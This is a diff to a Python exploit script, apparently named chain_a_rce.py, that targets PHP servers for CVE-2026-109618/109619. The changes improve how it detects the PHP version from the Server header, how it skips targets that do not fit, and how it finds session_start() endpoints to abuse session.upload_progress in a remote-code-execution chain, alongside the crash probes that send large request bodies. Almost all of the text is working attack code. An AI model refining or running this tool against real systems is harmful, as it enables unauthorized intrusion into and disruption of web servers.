@@ -182,6 +182,9 @@ def run_crash_probes(host, port, path) -> tuple:
 
     if not any(c in ctrl_st for c in ("200", "301", "302")):
         return None, None
+    # Redirect with no body means PHP isn't processing here — skip heavy probes
+    if not ctrl_body.strip():
+        return None, None
 
     for i, (size_mib, parts) in enumerate(PROBES, 1):
         probe_bytes = build_probe_body(size_mib, parts)
@@ -380,37 +383,55 @@ def main():
     info(f"GET /  →  {st_root}")
     info(f"Server: {server_h}")
 
+    # Also extract PHP version from Server header (e.g. Apache/x PHP/8.4.x)
+    if not php_ver:
+        m_srv = VERSION_RE.search(server_h)
+        if m_srv:
+            php_ver = f"PHP/{m_srv.group(1)}.{m_srv.group(2)}.{m_srv.group(3)}"
+
     ver_verdict = None
     if php_ver:
         ok(f"PHP detected: {php_ver}")
+        m_v = VERSION_RE.search(php_ver)
+        if m_v and int(m_v.group(1)) < 8:
+            warn(f"PHP {m_v.group(1)}.x — CVE-2026-109618/109619 affect PHP 8.x only")
+            print()
+            sys.exit(0)
         ver_verdict = version_verdict(php_ver)
         if ver_verdict == "FIXED":
             warn("Version appears patched — continuing anyway")
         elif ver_verdict == "VULNERABLE":
             ok("Version in vulnerable range")
     else:
-        warn("X-Powered-By header not found (expose_php may be Off)")
+        warn("X-Powered-By / Server header missing — cannot determine PHP version")
     sep()
 
     # ── Find upload endpoint ─────────────────────────────────────────
     info("Looking for PHP endpoint with session_start()...")
     upload_path = None
+    upload_path_fallback = None
     for path in UPLOAD_PATHS:
         fpath  = prefix + path
         resp   = post_upload(host, port, fpath, SID + "probe", "probe.txt")
         st     = status_line(resp)
         cookie = hdr(resp, "set-cookie")
         info(f"  {fpath} → {st}")
-        if (SID + "probe") in cookie or any(c in st for c in ("200", "301", "302")):
-            upload_path = upload_path or fpath
         if (SID + "probe") in cookie:
+            upload_path = fpath
             break
+        # 200 with non-empty body: possible session endpoint, keep as fallback
+        b_resp = body(resp)
+        if "200" in st and b_resp.strip() and not upload_path_fallback:
+            upload_path_fallback = fpath
+    if not upload_path:
+        upload_path = upload_path_fallback
 
     sep()
 
     if not upload_path:
-        err("No PHP endpoint with active session found on this target.")
-        err("session.upload_progress trigger requires session_start() or auto_start=On.")
+        err("No PHP endpoint with session_start() found.")
+        err("All probed paths returned redirects or were unreachable.")
+        err("Try passing a known PHP path: python3 chain_a_rce.py http://target/app/upload.php")
         print()
         sys.exit(1)
 
